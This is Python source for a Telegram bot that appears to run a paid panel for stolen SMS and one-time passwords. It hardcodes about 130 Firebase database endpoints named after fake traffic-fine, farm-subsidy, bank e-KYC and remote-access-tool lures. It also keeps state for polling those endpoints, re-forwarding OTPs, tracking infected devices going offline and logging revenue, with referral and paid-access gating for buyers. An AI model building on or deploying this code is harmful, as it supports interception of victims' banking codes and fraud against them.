    "\u26BD": "5235588635885054955",          # ⚽ -> premium 🎲
    "\u26BE": "5235588635885054955",          # ⚾ -> premium 🎲
    "\u26F3": "5235588635885054955",          # ⛳ -> premium 🎲
    "\U0001F3B3": "5235588635885054955",      # 🎳 -> premium 🎲
    "\U0001F3AF": "5235588635885054955",      # 🎯 -> premium 🎲
    "\U0001F9E9": "5235588635885054955",      # 🧩 -> premium 🎲
    "\U0001F9F8": "5440621591387980068",      # 🧸 -> premium 🔜
    "\U0001F381": "5440621591387980068",      # 🎁 -> premium 🔜
    "\U0001F38A": "5440621591387980068",      # 🎊 -> premium 🔜
    "\U0001F386": "5440621591387980068",      # 🎆 -> premium 🔜
    "\U0001F387": "5440621591387980068",      # 🎇 -> premium 🔜
    "\U0001F942": "5440621591387980068",      # 🥂 -> premium 🔜
    "\U0001F37E": "5440621591387980068",      # 🍾 -> premium 🔜
    "\U0001F36A": "5440621591387980068",      # 🍪 -> premium 🔜
    "\U0001F369": "5440621591387980068",      # 🍩 -> premium 🔜
    "\U0001F355": "5440621591387980068",      # 🍕 -> premium 🔜
    "\u2615": "5440621591387980068",          # ☕ -> premium 🔜
    "\U0001F37A": "5440621591387980068",      # 🍺 -> premium 🔜
    "\U0001F377": "5440621591387980068",      # 🍷 -> premium 🔜
    "\U0001F34E": "5440621591387980068",      # 🍎 -> premium 🔜
    "\U0001F34C": "5440621591387980068",      # 🍌 -> premium 🔜
    "\U0001F352": "5440621591387980068",      # 🍒 -> premium 🔜
    "\U0001F351": "5440621591387980068",      # 🍑 -> premium 🔜
    "\U0001F95C": "5440621591387980068",      # 🥜 -> premium 🔜
    "\U0001F4A7": "5404561694510833322",      # 💧 -> premium 💸
    "\U0001F30A": "5404561694510833322",      # 🌊 -> premium 💸
    "\U0001F525": "5224607267797606837",
}

# Longest keys first so multi-codepoint emoji win over their base char.
_PREMIUM_KEYS = sorted(PREMIUM_EMOJI_MAP.keys(), key=len, reverse=True)


_EMOJI_CLUSTER_RE = re.compile(
    r"(?:[\U0001F1E6-\U0001F1FF]{2})"
    r"|(?:"
    r"[\U0001F000-\U0001FAFF\u2600-\u27BF\u2B00-\u2BFF\u3030\u303D\u2139]"
    r"(?:\uFE0F|\u20E3)?"
    r"(?:[\U0001F3FB-\U0001F3FF])?"
    r"(?:\u200D[\U0001F000-\U0001FAFF\u2600-\u27BF\u2B00-\u2BFF](?:\uFE0F)?)*"
    r")",
    re.UNICODE,
)

# Blocks that must never be touched (Telegram rejects nested custom emoji in
# code/pre and we must not corrupt link targets).
_PROTECT_RE = re.compile(
    r"(<tg-emoji[^>]*>.*?</tg-emoji>|<code>.*?</code>|<pre>.*?</pre>|<a\s[^>]*>.*?</a>)",
    re.S,
)


def _premium_for(cluster: str) -> str:
    """Return a premium <tg-emoji> for an emoji cluster (stable mapping)."""
    base = cluster.replace("\uFE0F", "")
    eid = PREMIUM_EMOJI_MAP.get(cluster) or PREMIUM_EMOJI_MAP.get(base)
    if not eid:
        # Deterministic fallback: same emoji always -> same premium icon.
        eid = PREMIUM_EMOJI_IDS[sum(ord(c) for c in cluster) % len(PREMIUM_EMOJI_IDS)]
    # Keep the original cluster as the visible fallback so ZWJ sequences and
    # flags render correctly if a client cannot show the custom emoji.
    return f'<tg-emoji emoji-id="{eid}">{cluster}</tg-emoji>'


def premiumize_text(text: str) -> str:
    """Upgrade every emoji in a message to a premium <tg-emoji> entity.

    Only call this for HTML parse_mode messages. Existing premium blocks,
    <code>, <pre> and <a> blocks are left untouched.
    """
    if not text:
        return text
    parts = _PROTECT_RE.split(text)
    for i, part in enumerate(parts):
        if i % 2 == 1:  # protected block
            continue
        part = _EMOJI_CLUSTER_RE.sub(lambda m: _premium_for(m.group(0)), part)
        parts[i] = part
    out = "".join(parts)
    out = re.sub(r"[ \t]{2,}", " ", out)
    out = re.sub(r"\n{3,}", "\n\n", out)
    return out

# ── Global premium hook: premiumize every outgoing HTML message ──
def _install_premium_hooks() -> None:
    """Wrap Bot send/edit methods so every HTML text/caption is premiumized."""
    from telegram import Bot

    _HTML = ("HTML", "html")

    def _wrap(orig, field, pos):
        async def wrapper(self, *args, **kwargs):
            try:
                pm = kwargs.get("parse_mode")
                if pm in _HTML or pm is None:
                    # Default HTML replies to quote format when parse_mode missing and field is text-like.
                    if pm is None and field in ("text", "caption") and (
                        isinstance(kwargs.get(field), str) or (len(args) > pos and isinstance(args[pos], str))
                    ):
                        kwargs["parse_mode"] = "HTML"
                        pm = "HTML"
                if pm in _HTML:
                    if isinstance(kwargs.get(field), str):
                        kwargs[field] = ensure_quote(premiumize_text(kwargs[field]), "HTML")
                    elif len(args) > pos and isinstance(args[pos], str):
                        a = list(args)
                        a[pos] = ensure_quote(premiumize_text(a[pos]), "HTML")
                        args = tuple(a)
            except Exception:
                pass
            return await orig(self, *args, **kwargs)

        wrapper.__name__ = getattr(orig, "__name__", "wrapped")
        wrapper._premium_hooked = True
        return wrapper

    targets = (
        ("send_message", "text", 1),
        ("edit_message_text", "text", 0),
        ("send_photo", "caption", 2),
        ("send_document", "caption", 2),
        ("send_video", "caption", 2),
        ("send_animation", "caption", 2),
        ("send_audio", "caption", 2),
        ("edit_message_caption", "caption", 0),
    )
    for name, field, pos in targets:
        orig = getattr(Bot, name, None)
        if orig is None or getattr(orig, "_premium_hooked", False):
            continue
        setattr(Bot, name, _wrap(orig, field, pos))


_install_premium_hooks()


def quote_html(text: str) -> str:
    """Wrap every bot reply body in a Telegram blockquote (quote format)."""
    if text is None:
        return ""
    body = str(text).strip()
    if not body:
        return body
    # Already fully quoted — keep as-is.
    if body.startswith("<blockquote") and body.rstrip().endswith("</blockquote>"):
        return body
    return f"<blockquote>{body}</blockquote>"


def ensure_quote(text: str, parse_mode: str | None = "HTML") -> str:
    if not text:
        return text
    if parse_mode and str(parse_mode).upper() == "HTML":
        return quote_html(text)
    return text



def premium_button(
    text: str,
    *args,
    emoji_id: Optional[str] = None,
    fallback_emoji: str = "",
    style: str = None,
    **kwargs
):
    """Inline button with Premium custom-emoji icon and Bot API style.

    Existing calls remain compatible: premium_button(text, callback_data=...).
    """
    global _PREMIUM_INDEX

    old_emoji_id = kwargs.pop("icon_custom_emoji_id", None)
    if emoji_id is None:
        emoji_id = old_emoji_id

    if emoji_id is None and PREMIUM_EMOJI_IDS:
        emoji_id = PREMIUM_EMOJI_IDS[_PREMIUM_INDEX % len(PREMIUM_EMOJI_IDS)]
        _PREMIUM_INDEX += 1

    # Always guarantee a PREMIUM custom emoji icon.
    if emoji_id is None and PREMIUM_EMOJI_IDS:
        emoji_id = PREMIUM_EMOJI_IDS[_PREMIUM_INDEX % len(PREMIUM_EMOJI_IDS)]
        _PREMIUM_INDEX += 1

    # Remove every non-premium emoji from the visible button label.
    text = strip_emoji(text) or "Button"

    api_kwargs = dict(kwargs.pop("api_kwargs", {}) or {})

    # ⚠️ CRITICAL FIX:
    # PTB 22.5 me copy_text ek OBJECT (CopyTextButton) hona chahiye, plain
    # string nahi — warna "field copy_text must be of type object" error.
    # Aur Telegram copy_text buttons ke saath icon_custom_emoji_id / style
    # accept nahi karta, isliye unhe simple rakhte hain.
    _ct = kwargs.get("copy_text")
    if _ct is not None and _PTB_COPY_TEXT_BUTTON is not None:
        if not isinstance(_ct, _PTB_COPY_TEXT_BUTTON):
            _ct = _PTB_COPY_TEXT_BUTTON(str(_ct))
        kwargs["copy_text"] = _ct
        return _PTB_INLINE_KEYBOARD_BUTTON(text, *args, **kwargs)

    if emoji_id:
        api_kwargs["icon_custom_emoji_id"] = emoji_id

    # Default every inline button to Telegram's primary style.
    # Explicit success/danger values override it.
    selected_style = style if style in ("primary", "success", "danger") else "primary"
    api_kwargs["style"] = selected_style

    return _PTB_INLINE_KEYBOARD_BUTTON(
        text, *args, api_kwargs=api_kwargs, **kwargs
    )

# ═══════════════════════════════════════════════════════
#  CONFIG (UPDATED: REMOVED ALPHA_A23 AND RND12_17508)
# ═══════════════════════════════════════════════════════

DEFAULT_DATABASES = {
    "👑 BOSS_R1": "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "👑 BOSS_R2": "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "⚡ ALPHA_A2": "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "🔥 ALPHA_A5": "https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "⚔️ ALPHA_A12": "https://fir-1fa16-default-rtdb.firebaseio.com",
    "🎯 ALPHA_A19": "https://u40179853-987df-default-rtdb.firebaseio.com",
    "🔫 ALPHA_A21": "https://u62803313-e54bc-default-rtdb.firebaseio.com",
    "🦾 ALPHA_A24": "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
    "🏹 ALPHA_A27": "https://u8208372-ad1d1-default-rtdb.firebaseio.com",
    "🌪 ALPHA_A29": "https://u25428732-91bd9-default-rtdb.firebaseio.com",
    "💥 ALPHA_A31": "https://u72749819-fa563-default-rtdb.firebaseio.com",
    "🩸 ALPHA_A32": "https://u24143844-c1b11-default-rtdb.firebaseio.com",
    "👹 ALPHA_A33": "https://u72328193-47b68-default-rtdb.firebaseio.com",
    "🎭 ALPHA_A34": "https://u58325342-dffc0-default-rtdb.firebaseio.com",
    "⛓ ALPHA_A35": "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "🧿 ALPHA_A36": "https://u24153206-5eef6-default-rtdb.firebaseio.com",
    "💵 MAFIA_M7": "https://rto-47-b39f4-default-rtdb.firebaseio.com",
    "💰 MAFIA_M15_1": "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "💎 MAFIA_M15_2": "https://ai-rto-9-default-rtdb.firebaseio.com",
    "✨ VIP_EXTRA": "https://s85138920-87594-default-rtdb.firebaseio.com",
    "📦 FORTY_DATA": "https://fortydata-fee65-default-rtdb.firebaseio.com",
    "📡 FPRO_INDUS": "https://fpro3indus-default-rtdb.firebaseio.com",
    "🚨 JAMTARA_181": "https://jamtara181-default-rtdb.firebaseio.com",
    "🛸 PMS_JDJ": "https://pmsjdj-default-rtdb.firebaseio.com",
    "💻 MY_CARRY": "https://cs6mycarry68jh-default-rtdb.firebaseio.com",
    "🃏 RANDI_RONA": "https://randi-rona-81876-default-rtdb.firebaseio.com",
    "🚔 RTO_CHALLAN_A": "https://rtochallan-8579d-default-rtdb.firebaseio.com",
    "🛑 RTO_CHALLAN_B": "https://rtochallan8-default-rtdb.firebaseio.com",
    "🐾 JAMTARA_140": "https://jamtara140-73bf7-default-rtdb.firebaseio.com",
    "🔮 GGGGGG_NODE": "https://gggggg-979bd-default-rtdb.firebaseio.com",
    # ── Naye Panels ──────────────────────────────────────
    "🟣 CSFORME_DC64A": "https://csforme-dc64a-default-rtdb.firebaseio.com",
    "🔵 SANJEE_9918A": "https://sanjee-9918a-default-rtdb.firebaseio.com",
    "🟤 BITTU_2D39E": "https://bittu-2d39e-default-rtdb.firebaseio.com",
    "😈 DEMON_4": "https://demon-4-default-rtdb.firebaseio.com",
    "🐕 DOGLA_DE225": "https://dogla-de225-default-rtdb.firebaseio.com",
    "🎲 RANDO_ACF5A": "https://rando-acf5a-default-rtdb.firebaseio.com",
    "🅰️ AAAA_B3749": "https://aaaa-b3749-default-rtdb.firebaseio.com",
    "🧩 AJAY_33C1B": "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "🌾 PM_KISAN_13GFH": "https://pm-kisan-13gfh-default-rtdb.firebaseio.com",
    "6️⃣ SERVER_6_42C3B": "https://server-6-42c3b-default-rtdb.firebaseio.com",
    "🌱 PM_KISHAN_23GUG": "https://pm-kishan-23gug-default-rtdb.firebaseio.com",
    "🔛 GO_ONE_1B6B2": "https://go-one-1b6b2-default-rtdb.firebaseio.com",
    "♻️ RC_39_15": "https://rc-39-15-default-rtdb.firebaseio.com",
    "📋 PANEL_WALA_V70": "https://panel-wala-v70-default-rtdb.firebaseio.com",
    "🌀 UDKUDJUDJ": "https://udkudjudj-default-rtdb.firebaseio.com",
    "🌐 YOURFIREBASE": "https://yourfirebase-default-rtdb.firebaseio.com",
    "👨 RAJ254346KUMAR": "https://raj254346kumar-84033-default-rtdb.firebaseio.com",
    "📋 PANEL_WALA_V11": "https://panel-wala-v11-default-rtdb.firebaseio.com",
    "🦀 CRAXS_4C542": "https://craxs-4c542-default-rtdb.firebaseio.com",
    "⛓ U75887828_B5A63": "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "👁 AJNA_20FC4": "https://ajna-20fc4-default-rtdb.firebaseio.com",
    "🙏 RAMESHWAR_7OKT": "https://rameshwar-7okt-default-rtdb.firebaseio.com",
    "📱 MYAPP_8228A": "https://myapp-8228a-default-rtdb.firebaseio.com",
    "🏆 E5TURNAMENT2": "https://e5turnament2-default-rtdb.firebaseio.com",
    "🌊 RAKI143AA": "https://raki143aa-default-rtdb.firebaseio.com",
    "🚗 RTO91_2B27F": "https://rto91-2b27f-default-rtdb.firebaseio.com",
    "😫 PAINISLV": "https://painislv-default-rtdb.firebaseio.com",
    "⚡ SHOWN SPECIAL": "https://flash-v8enginepower-default-rtdb.firebaseio.com",
    "🍆 LODA_5029E": "https://loda-5029e-default-rtdb.firebaseio.com",
    "⚓ ANKUR_2511F": "https://ankur-2511f-default-rtdb.firebaseio.com",
    "🔷 U62751482_F5B46": "https://u62751482-f5b46-default-rtdb.firebaseio.com",
    "🔥 FIR_27C9E": "https://fir-27c9e-default-rtdb.firebaseio.com",
    "☁️ KUMARLIVE1": "https://kumarlive1-default-rtdb.firebaseio.com",
   "ADMIN_822E2": "https://admin-822e2-default-rtdb.firebaseio.com",
   "AJNA_20FC4": "https://ajna-20fc4-default-rtdb.firebaseio.com",
   "APKDRIOD": "https://apkdriod-default-rtdb.firebaseio.com",
   "AJAY_33C1B": "https://ajay-33c1b-default-rtdb.firebaseio.com",
   "ASDTEST_PROJECT": "https://asdtest-project-default-rtdb.firebaseio.com",
   "BANDHAN2_7JAN": "https://bandhan2-7jan-default-rtdb.firebaseio.com",
   "BANK_E_KYC": "https://bank-e-kyc-default-rtdb.firebaseio.com",
   "CHFJFJ_C2857": "https://chfjfj-c2857-default-rtdb.firebaseio.com",
   "CAN_4_668A0": "https://can-4-668a0-default-rtdb.firebaseio.com",
   "CHHNUK05_3188E": "https://chhnuk05-3188e-default-rtdb.firebaseio.com",
   "BUSINESS_APPS_BA1_8D27C": "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
   "CSFORME_DC64A": "https://csforme-dc64a-default-rtdb.firebaseio.com",
   "DARK_274B4": "https://dark-274b4-default-rtdb.firebaseio.com",
   "GGGGGG_979BD": "https://gggggg-979bd-default-rtdb.firebaseio.com",
   "FIRES_847DA": "https://fires-847da-default-rtdb.firebaseio.com",
   "FPRO3INDUS": "https://fpro3indus-default-rtdb.firebaseio.com",
   "BUSINESS_APPS_BA1_F86B7": "https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com",
   "HSM2PRO21": "https://hsm2pro21-default-rtdb.firebaseio.com",
   "INDUS_1_CEC4F": "https://indus-1-cec4f-default-rtdb.firebaseio.com",
   "IMDUM_6E873": "https://imdum-6e873-default-rtdb.firebaseio.com",
   "IPL2025_62676": "https://ipl2025-62676-default-rtdb.firebaseio.com",
   "KINGBGGBB": "https://kingbggbb-default-rtdb.firebaseio.com",
   "KUMU_F2257": "https://kumu-f2257-default-rtdb.firebaseio.com",
   "LOVEFIMUS": "https://lovefimus-default-rtdb.firebaseio.com",
   "M74946448_80A23": "https://m74946448-80a23-default-rtdb.firebaseio.com",
   "M05960864_6140E": "https://m05960864-6140e-default-rtdb.firebaseio.com",
   "M93374762_8C0F6": "https://m93374762-8c0f6-default-rtdb.firebaseio.com",
   "M90910540_A4E00": "https://m90910540-a4e00-default-rtdb.firebaseio.com",
   "M631835370_CFDC7": "https://m631835370-cfdc7-default-rtdb.firebaseio.com",
   "MASTER80221_753FB": "https://master80221-753fb-default-rtdb.firebaseio.com",
   "MASTER89812_B77A6": "https://master89812-b77a6-default-rtdb.firebaseio.com",
   "MKADMIN_13DD5": "https://mkadmin-13dd5-default-rtdb.firebaseio.com",
   "MYADMIN_38635": "https://myadmin-38635-default-rtdb.firebaseio.com",
   "PANEL_WALA_V16": "https://panel-wala-v16-default-rtdb.firebaseio.com",
   "PANEL_WALA_V28": "https://panel-wala-v28-default-rtdb.firebaseio.com",
   "PANEL123628": "https://panel123628-default-rtdb.firebaseio.com",
   "PAWANKUMAR92342038_8F702": "https://pawankumar92342038-8f702-default-rtdb.firebaseio.com",
   "PM_KISAN_111": "https://pm-kisan-111-default-rtdb.firebaseio.com",
   "PMSJDJ": "https://pmsjdj-default-rtdb.firebaseio.com",
   "PRIYAKNN_3E914": "https://priyaknn-3e914-default-rtdb.firebaseio.com",
   "PROJECT_X_50AB7": "https://project-x-50ab7-default-rtdb.firebaseio.com",
   "R62710898_39A8E": "https://r62710898-39a8e-default-rtdb.firebaseio.com",
   "RAHU80759_AC69B": "https://rahu80759-ac69b-default-rtdb.firebaseio.com",
   "RAJA252525RAJ_4EE9A": "https://raja252525raj-4ee9a-default-rtdb.firebaseio.com",
   "RAJKUMAR8822556644_407F5": "https://rajkumar8822556644-407f5-default-rtdb.firebaseio.com",
   "RANDI_RONA_81876": "https://randi-rona-81876-default-rtdb.firebaseio.com",
   "RANTAISHITA_F7614": "https://rantaishita-f7614-default-rtdb.firebaseio.com",
   "RAVIKUMAR7788CCN_11C83": "https://ravikumar7788ccn-11c83-default-rtdb.firebaseio.com",
   "REXXX_4C7A7": "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
   "RTO3_53DC7": "https://rto3-53dc7-default-rtdb.firebaseio.com",
   "RTO9_D2B33": "https://rto9-d2b33-default-rtdb.firebaseio.com",
   "RTOCHALLAN_8579D": "https://rtochallan-8579d-default-rtdb.firebaseio.com",
   "RTOCHALLAN8": "https://rtochallan8-default-rtdb.firebaseio.com",
   "RTOMATRIX_C1E78": "https://rtomatrix-c1e78-default-rtdb.firebaseio.com",
   "S85138920_87594": "https://s85138920-87594-default-rtdb.firebaseio.com",
   "RUPARAMEE_14F4B": "https://ruparamee-14f4b-default-rtdb.firebaseio.com",
   "SALASALI6990_1171D": "https://salasali6990-1171d-default-rtdb.firebaseio.com",
   "SEP12_AEA6D": "https://sep12-aea6d-default-rtdb.firebaseio.com",
   "SERVER_23_D1605": "https://server-23-d1605-default-rtdb.firebaseio.com",
   "SERVER_97_E23E": "https://server-97e23-default-rtdb.firebaseio.com",
   "SIKAPRO13UAGTWO": "https://sikapro13uagtwo-default-rtdb.firebaseio.com",
   "SIWANIKUMAR923420_2E01F": "https://siwanikumar923420-2e01f-default-rtdb.firebaseio.com",
   "STSFK30AUG": "https://stsfk30aug-default-rtdb.firebaseio.com",
   "TILLU_2": "https://tillu-2-default-rtdb.firebaseio.com",
   "TRYING_90B4B": "https://trying-90b4b-default-rtdb.firebaseio.com",
   "U13667713_DC566": "https://u13667713-dc566-default-rtdb.firebaseio.com",
   "U16714964_283EF": "https://u16714964-283ef-default-rtdb.firebaseio.com",
   "U24143844_C1B11": "https://u24143844-c1b11-default-rtdb.firebaseio.com",
   "U24153206_5EEF6": "https://u24153206-5eef6-default-rtdb.firebaseio.com",
   "U25783858_E6739": "https://u25783858-e6739-default-rtdb.firebaseio.com",
   "U40179853_987DF": "https://u40179853-987df-default-rtdb.firebaseio.com",
   "U58325342_DFFC0": "https://u58325342-dffc0-default-rtdb.firebaseio.com",
   "U25428732_91BD9": "https://u25428732-91bd9-default-rtdb.firebaseio.com",
   "U62751482_F5B46": "https://u62751482-f5b46-default-rtdb.firebaseio.com",
   "U62803313_E54BC": "https://u62803313-e54bc-default-rtdb.firebaseio.com",
   "U67583339_BF0C1": "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
   "U72328193_47B68": "https://u72328193-47b68-default-rtdb.firebaseio.com",
   "U72749819_FA563": "https://u72749819-fa563-default-rtdb.firebaseio.com",
   "U75887828_B5A63": "https://u75887828-b5a63-default-rtdb.firebaseio.com",
   "U8208372_AD1D1" : "https://u8208372-ad1d1-default-rtdb.firebaseio.com",
   "YBVFGG-AA0F5"   :  "https://ybvfgg-aa0f5-default-rtdb.firebaseio.com"
}

DATABASES = dict(DEFAULT_DATABASES)

POLL_INTERVAL  = 15
SMS_LIMIT      = 10
DB_CONCURRENCY = 50
TOKEN          = os.environ.get("BOT_TOKEN", "")
BOT_USERNAME   = os.environ.get("BOT_USERNAME", "@shownpanel_Xbot")
DB_FILE        = "bot_database.json"

# ═══════════════════════════════════════════════════════
#  FORCE JOIN + REFERRAL GATE
# ═══════════════════════════════════════════════════════
# Set these from the Admin Panel at runtime.
FORCE_JOIN_ENABLED = False
# Master switch: TRUE = access locked.
# User tab tak andar nahi aa sakta jab tak:
#   (a) owner usay /grant se access na de, YA
#   (b) wo REQUIRED_REFERRALS (2) valid referrals complete na kar le.
GRANT_ACCESS_REQUIRED = True
# Multiple Force Join channels. Each item is:
# {"channel": "@publicchannel" or "-100...", "url": "https://t.me/..."}
FORCE_JOIN_CHANNELS: list[dict] = []
# Referral gate ON — 2 referrals ke baad hi unlock.
REFERRAL_ENABLED = True
REQUIRED_REFERRALS = 2

# Private log channel — set/remove from Admin Panel.
# When set, join / referral / access events are posted there (quote format).
LOG_CHANNEL_ID: int = -1004363291524

# ── OWNER / ADMIN ─────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════
#  SINGLE OWNER — sirf ek hi owner hai: 8984851474
#  Koi doosra admin nahi. Koi "first user" admin nahi banta.
# ══════════════════════════════════════════════════════════════
# ── BRANDING (env se override ho sakta hai) ─────────────────
BOT_BRAND_NAME     = os.environ.get("BOT_BRAND_NAME", "˹Sʜᴏᴡɴ Lᴇɢᴀᴄʏ")
OWNER_DISPLAY_NAME = os.environ.get("OWNER_DISPLAY_NAME", "Sʜᴏᴡɴ")
OWNER_CONTACT      = os.environ.get("OWNER_CONTACT", "@ShownOfficial")

# Owner ka current username (case-insensitive match hota hai).
OWNER_USERNAME = "ShownOfficial"
# Purane / alternate usernames (optional safety). Khali chhodna ho to set().
OWNER_ALT_USERNAMES: set[str] = set()
# Hardcoded owner numeric ID — agar username badal jaye tab bhi admin rahega.
OWNER_HARD_ID = 8695946179
# Sirf yahi ek ID owner/admin hai.
OWNER_IDS: set[int] = {OWNER_HARD_ID}
ADMIN_IDS: set[int] = {OWNER_HARD_ID}
# Sirf ye usernames admin ban sakte hain (numeric ID pehli baar /start par
# automatically resolve aur permanently save ho jati hai).
ADMIN_USERNAMES: set[str] = {OWNER_USERNAME} | OWNER_ALT_USERNAMES


def maybe_promote_admin(user) -> bool:
    """Auto-grant admin to configured usernames. Returns True if admin."""
    try:
        if user is None:
            return False
        uid = user.id
        # STRICT SINGLE OWNER: sirf OWNER_HARD_ID hi owner hai.
        # Username-based auto-promotion band hai taake koi doosra
        # kabhi bhi admin/owner na ban jaye.
        if uid == OWNER_HARD_ID:
            if uid not in ADMIN_IDS:
                ADMIN_IDS.add(uid)
            if uid not in OWNER_IDS:
                OWNER_IDS.add(uid)
            return True
        # Kisi bhi doosre user ko owner/admin nahi banne dena.
        return False
    except Exception:
        return False

# ═══════════════════════════════════════════════════════
#  GLOBAL STATE
# ═══════════════════════════════════════════════════════

seen_ids: set[str] = set()
# Bada limit taake trimming kam se kam ho — trim hone par purane SMS keys
# dobara "new" samajh kar OTP re-forward ho sakte hain.
MAX_SEEN_IDS = 200000
first_run: bool = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}


# pending_action: chat_id -> {"action": str, ...}
# (Pehle yahan debug tracer tha jo har click par stack trace log karta tha —
#  production me log spam tha, ab saada dict hai.)
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
chats_registry: set[int] = set()

allowed_users: set[int] = set()
ADMIN_ONLY_TAGS: set[str] = set()
user_focus: dict[int, str] = {}
user_page: dict[int, int] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}
pending_kw_confirm: dict[int, str] = {}   # chat_id → keyword (waiting for confirm)

# ═══════════════════════════════════════════════════════
#  FEATURE STATE — All 10 additions
# ═══════════════════════════════════════════════════════

# F1: Heatmap — hour (0-23) -> request count
_heatmap: dict[int, int] = defaultdict(int)

# F2: DB health failure tracker — tag -> consecutive_fail_count
_db_fail_streak: dict[str, int] = defaultdict(int)
_db_alerted: set[str] = set()   # tags already alerted this cycle

# F4: Broadcast scheduler — list of {time_hhmm, text, added_by}
_scheduled_broadcasts: list[dict] = []
_broadcast_sent_today: set[str] = set()  # "HHMM" keys sent today

# F6: Device offline tracker — device_id -> first_seen_offline_ts
_device_offline_since: dict[str, float] = {}
_device_offline_alerted: set[str] = set()
DEVICE_OFFLINE_ALERT_POLLS = 2   # consecutive offline polls before alert

# F8: Quick ban — log_msg_id -> user_id mapping
_quickban_map: dict[int, int] = {}   # message_id in log channel -> user_id

# F9: Referral weekly sent tracker
_referral_weekly_sent: str = ""   # "YYYY-WNN" last sent week

# ── v5 Feature State ──────────────────────────────────

# F1: OTP watermark — unique trace ID per user per message
_watermark_counter: int = 0

# F2: Session tracker — user_id -> {start_ts, last_ts, otp_count}
_user_sessions: dict[int, dict] = defaultdict(lambda: {"start": 0.0, "last": 0.0, "otps": 0, "active": False})

# F3: Admin duty mode — set of admin IDs currently on duty
_duty_admins: set[int] = set()
DUTY_MODE_ENABLED: bool = False   # global flag; False = all admins get alerts

# F4: Revenue tracker — list of {ts, user_id, name, days, amount}
_revenue_log: list[dict] = []

# F5: SMS keyword filter — None = forward all, set = only matching SMS forward
_sms_keyword_filter: set[str] = set()
SMS_FILTER_ENABLED: bool = False

# F6: Device alias map — device_id -> custom label
_device_aliases: dict[str, str] = {}

# F7: Multi-admin approval pending — action_id -> {action, by, votes, needed, data}
_approval_pending: dict[str, dict] = {}
MULTI_ADMIN_REQUIRED_VOTES = 2

# F8: User notes — user_id -> list of {ts, note, by}
_user_notes: dict[int, list] = defaultdict(list)

# F10: Paginated user list cache (rebuilt on demand)
_user_list_cache: list[tuple] = []   # [(uid, name, status), ...]

# F11: OTP expiry countdown — message_id -> {chat_id, otp, expire_ts, bot}
_otp_countdown_msgs: dict[int, dict] = {}
OTP_EXPIRE_SECS = 300   # 5 minutes default

# ═══════════════════════════════════════════════════════
#  ACCESS CONTROL HELPERS
# ═══════════════════════════════════════════════════════

def has_access(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    # Per-user access expiry (unix ts). 0 / missing = no expiry.
    udata = all_users.get(user_id, {})
    exp = int(udata.get("access_expires_at", 0) or 0)
    if exp and time.time() > exp:
        if user_id in allowed_users:
            allowed_users.discard(user_id)
            udata["access_expires_at"] = 0
            try:
                save_data()
            except Exception:
                pass
        # fall through to other gates
    elif user_id in allowed_users:
        return True
    # MASTER SWITCH OFF -> sab ko access (koi "Access Required" error nahi).
    if not GRANT_ACCESS_REQUIRED:
        return True
    if REFERRAL_ENABLED and referral_count(user_id) >= max(0, int(REQUIRED_REFERRALS)):
        return True
    return False

def grant_access(user_id: int, days: int = 0) -> None:
    """Grant access. days>0 sets per-user expiry from now."""
    allowed_users.add(user_id)
    udata = all_users.setdefault(user_id, {})
    if days and days > 0:
        udata["access_expires_at"] = int(time.time()) + int(days) * 86400
        udata["access_granted_at"] = int(time.time())
    else:
        udata["access_expires_at"] = 0
        udata["access_granted_at"] = int(time.time())
    udata["expiry_warned_24h"] = False
    udata["expiry_notified"] = False
    save_data()

def revoke_access(user_id: int) -> None:
    allowed_users.discard(user_id)
    if user_id in all_users:
        all_users[user_id]["access_expires_at"] = 0
    save_data()


async def _resolve_user_arg(ctx, text: str) -> Optional[int]:
    """Admin inputs ke liye: numeric ID ya @username se user ID nikalta hai.
    Pehle known users me dhundhta hai, phir Telegram se resolve karta hai."""
    raw = (text or "").strip()
    if not raw:
        return None
    try:
        return int(raw)
    except ValueError:
        pass
    handle = raw.lstrip("@").lower()
    if not re.fullmatch(r"[a-z0-9_]{3,}", handle):
        return None
    for uid, u in all_users.items():
        if (u.get("username") or "").lower() == handle:
            try:
                return int(uid)
            except (TypeError, ValueError):
                continue
    try:
        chat = await ctx.bot.get_chat("@" + handle)
        return int(chat.id)
    except Exception:
        return None


def referral_count(user_id: int) -> int:
    data = all_users.get(user_id, {})
    refs = data.get("referrals", [])
    if not isinstance(refs, list):
        return 0
    return len(set(str(x) for x in refs))


def referral_unlocked(user_id: int) -> bool:
    if user_id in ADMIN_IDS or user_id in allowed_users:
        return True
    if not REFERRAL_ENABLED:
        return True
    return referral_count(user_id) >= max(0, int(REQUIRED_REFERRALS))


def build_bot_referral_link(user_id: int) -> str:
    username = BOT_USERNAME.lstrip("@")
    return f"https://t.me/{username}?start=ref_{user_id}"


def register_referrer(user_id: int, referrer_id: Optional[int]) -> bool:
    if not referrer_id or referrer_id == user_id:
        return False
    if referrer_id not in all_users:
        return False

    udata = all_users.setdefault(user_id, {})
    existing = udata.get("referred_by")
    if existing:
        return False

    udata["referred_by"] = int(referrer_id)
    udata.setdefault("referral_qualified", False)
    save_data()
    return True


def qualify_referral(user_id: int) -> bool:
    """Count a referral only after the referred user passes the gate."""
    udata = all_users.get(user_id, {})
    if not udata.get("referred_by"):
        return False
    if udata.get("referral_qualified"):
        return False

    referrer_id = int(udata["referred_by"])
    if referrer_id == user_id or referrer_id not in all_users:
        return False

    ref_data = all_users.setdefault(referrer_id, {})
    refs = ref_data.setdefault("referrals", [])
    if not isinstance(refs, list):
        refs = []
        ref_data["referrals"] = refs

    if str(user_id) not in {str(x) for x in refs}:
        refs.append(user_id)

    udata["referral_qualified"] = True
    save_data()
    return True


def get_force_join_url(channel_data: dict) -> str:
    """Return the configured join URL for one Force Join channel."""
